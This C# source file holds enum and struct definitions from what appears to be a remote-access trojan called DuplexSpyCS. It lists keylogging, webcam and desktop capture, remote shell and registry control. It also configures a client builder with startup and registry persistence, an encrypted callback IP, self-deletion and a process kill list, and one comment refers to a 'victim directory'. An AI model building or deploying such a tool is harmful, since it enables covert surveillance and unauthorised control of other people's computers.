
namespace DuplexSpyCS
{
    /// <summary>
    /// 
    /// </summary>
    public enum Function
    {
        //INFORMATION
        Information,
        ClientConfig,

        //SYSTEM
        System,

        //MANAGEMENT
        Manager,

        TextEditor,
        FileImage,
        FileNewItem,
        FileDelState,
        FileExec,
        FilePaste,
        FileArchive,
        FileFind,
        FileWGET,

        RegAddKey,
        RegDeleteKey,
        RegRenameKey,

        RegAddValue,
        RegDeleteValue,
        RegRenameValue,

        RegExport,
        RegImport,

        RegFind,

        Shell,
        Desktop,
        Webcam,
        Audio,
        FunStuff,
        Misc,
        WMI,

        //MICS
        KeyLogger,
        Chat,
        RunScript,

        //BATCH
        MultiDesktop,
        MultiWebcam,

        //OTHER
        TransferFileState,
        Logs,
    };

    /// <summary>
    /// 
    /// </summary>
    public enum TransferFileType
    {
        Upload,
        Download,
    }

    /// <summary>
    /// 
    /// </summary>
    public enum ColorStyleMode
    {
        LightMode,
        DarkMode,
        DarkModeGreenText,
        DarkModeBlueText,
    }

    /// <summary>
    /// 
    /// </summary>
    public enum ArchiveAction
    {
        Compress,
        Extract,
    }

    /// <summary>
    /// 
    /// </summary>
    public enum ListViewExportType
    {
        TextFile,
        CSV,
    }

    //Build
    public enum ClientType
    {
        Merged,
        Small,
    };
    public enum ClientLanguage
    {
        CSharp,
        Cpp,
    }

    public class C3
    {
        public static Dictionary<ColorStyleMode, Dictionary<string, Color>> dic_ColorModeStylee = new Dictionary<ColorStyleMode, Dictionary<string, Color>>()
        {
            {
                ColorStyleMode.LightMode, new Dictionary<string, Color>()
                {
                    { "back", SystemColors.Control },
                    { "fore", Color.Black },
                }
            },
            {
                ColorStyleMode.DarkMode, new Dictionary<string, Color>()
                {
                    { "back", Color.Black },
                    { "fore", Color.White },
                }
            },
            {
                ColorStyleMode.DarkModeBlueText, new Dictionary<string, Color>()
                {
                    { "back", Color.Black },
                    { "fore", Color.FromArgb(192, 192, 255) },
                }
            },
            {
                ColorStyleMode.DarkModeGreenText, new Dictionary<string, Color>()
                {
                    { "back", Color.Black },
                    { "fore", Color.LimeGreen },
                }
            }
        };
    }

    public struct MsgBoxConfig
    {
        public string context;
        public string caption;
        public MessageBoxButtons button;
        public MessageBoxIcon icon;
    }

    //Build client config
    public struct BuildConfig
    {
        public string szIP;
        public int dwPort;
        public int dwTimeout; //Milisecond
        public int dwRetry; //Milisecond
        public int dwInterval; //Send inform interval, ms

        public bool bEncryptIP; //Encrypt IP

        public string szServName;
        public string szServInfo;

        //Install
        public bool bCopyDir;
        public string szCopyDir;
        public bool bCopyStartUp;
        public string szStartUpName;
        public bool bRegistry;
        public string szRegKeyName;

        //Misc
        public string szKeylogFileName;
        public bool bMsgBox; //Enable message box.
        public MsgBoxConfig msgboxConfig;

        public bool bIcon;
        public Image icon;

        public bool bDelete;
        public DateTime dtDelete;

        public ClientType clntType;
        public ClientLanguage clntLang;
    }

    public struct SettingConfig
    {
        #region General
        /// <summary>
        /// Listen port number.
        /// </summary>
        public int dwListenPort;

        /// <summary>
        /// Sqlite database file path.
        /// </summary>
        public string szDbFile;

        /// <summary>
        /// Socket send/receive timeout (milisecond).
        /// </summary>
        public int dwTimeout;

        /// <summary>
        /// Time interval of display received bytes.
        /// </summary>
        public int dwShowReceived;

        /// <summary>
        /// Time interval of display sent bytes.
        /// </summary>
        public int dwShowSent;

        /// <summary>
        /// Show logs after this datetime.
        /// </summary>
        public DateTime dtLogs;

        #endregion
        #region Manager
        #region FileMgr

        /// <summary>
        /// Thread count.
        /// </summary>
        public int fileMgr_dwThread;

        /// <summary>
        /// Maximum folders count obtain from remote host.
        /// </summary>
        public int fileMgr_dwMaxFolder;

        /// <summary>
        /// Maximum files count obtain from remote host.
        /// </summary>
        public int fileMgr_dwMaxFile;

        /// <summary>
        /// Socket timeout.
        /// </summary>
        public int fileMgr_dwTimeout;

        /// <summary>
        /// Maximum count of read bytes in UploadFile (KB).
        /// </summary>
        public int fileMgr_dwUfChunkSize;

        /// <summary>
        /// Maximum count of read bytes in DownloadFile (KB), this value will be applied in remote host.
        /// </summary>
        public int fileMgr_dwDfChunkSize;

        /// <summary>
        /// Enable restriciton of maximum folders count, set false to show all folders.
        /// </summary>
        public bool fileMgr_bMaxFolder;

        /// <summary>
        /// Enable restriction of maximum files count, set false to show all files.
        /// </summary>
        public bool fileMgr_bMaxFile;

        #endregion
        #region TaskMgr

        public string taskMgr_szAVjson;
        public bool taskMgr_bGetChildProcess;

        #endregion
        #region ServMgr

        public string servMgr_szAVjson;

        #endregion
        #region RegEdit

        /// <summary>
        /// Maximum count of key obtain from remote host.
        /// </summary>
        public int reg_dwMaxKey;

        /// <summary>
        /// Maximum count of value obtain from remote host.
        /// </summary>
        public int reg_dwMaxValue;

        /// <summary>
        /// Enable maximum count restriction of key.
        /// </summary>
        public bool reg_bMaxKey;

        /// <summary>
        /// Enable maximum count restriction of value.
        /// </summary>
        public bool reg_bMaxValue;

        #endregion
        #endregion
        #region Terminal

        #region Shell

        /// <summary>
        /// Initial execution.
        /// </summary>
        public string shell_szExec;

        /// <summary>
        /// Enable command history function
        /// </summary>
        public bool shell_bHistory;

        /// <summary>
        /// Command history filename(Not fullpath, this file is stored in victim directory).
        /// </summary>
        public string shell_szHistory;

        #endregion
        #region WMI Query

        #endregion

        #endregion
        #region Monitor

        /// <summary>
        /// Display remote datetime on left upper corner.
        /// </summary>
        public bool monitor_bShowDate;

        /// <summary>
        /// 
        /// </summary>
        public int monitor_dwQuality;

        #endregion
        #region Webcam

        public bool webcam_bShowDate;
        public int webcam_dwQuality;

        #endregion
        #region FunStuff

        public string msgbox_szCaption;
        public string msgbox_szText;

        public string ballon_szTitle;
        public string ballon_szText;
        public int balloon_nTime;

        public string szLockScreenDir;
        public string szWallpaperDir;

        #endregion
        #region Audio

        public string szSpeakText;

        #endregion
        #region Socket Transmission Cryptography

        public string crypto_szChallengeText;
        public bool crypto_bRandomChallenge;
        public int crypto_dwChallengeLength;

        #endregion
        #region Build

        public bool bCopyDir;
        public bool bStartUp;
        public string szStartUpName;
        public bool bRegistry;
        public string szRegKeyName;

        #endregion
    }

    public struct BasicInfo
    {
        public string szOnlineID;
        public string szUsername;
        public bool bIsAdmin;
        public string szOS;
        public int dwPing;
        public string szCPU;
        public int dwMonitorCount;
        public int dwWebcamCount;
        public string szActiveWindowTitle;
        public Image imgScreenshot;
    }

    public struct ClientConfig
    {
        public string szOnlineID;

        public int dwTimeout;
        public int dwSendInfo;
        public int dwRetry;

        public List<string> ls_szKillProcess;
        public bool bKillProcess;
    }

    public struct ClientInfo
    {
        public string szDnsHostName { get; set; }
        public string szStartupPath { get; set; }
        public string szCurrentProcName { get; set; }
        public string szMachineName { get; set; }
        public string szUsername { get; set; }
        public string szUserDomainName { get; set; }
        public string szOS { get; set; }

        public Dictionary<string, Rectangle> ls_Monitor { get; set; }
    }

    public struct WindowInfo
    {
        public string szTitle;
        public string szProcessName;
        public string szFilePath;
        public int nProcessId;
        public int nHandle;
        public Icon iWindow;
    }
}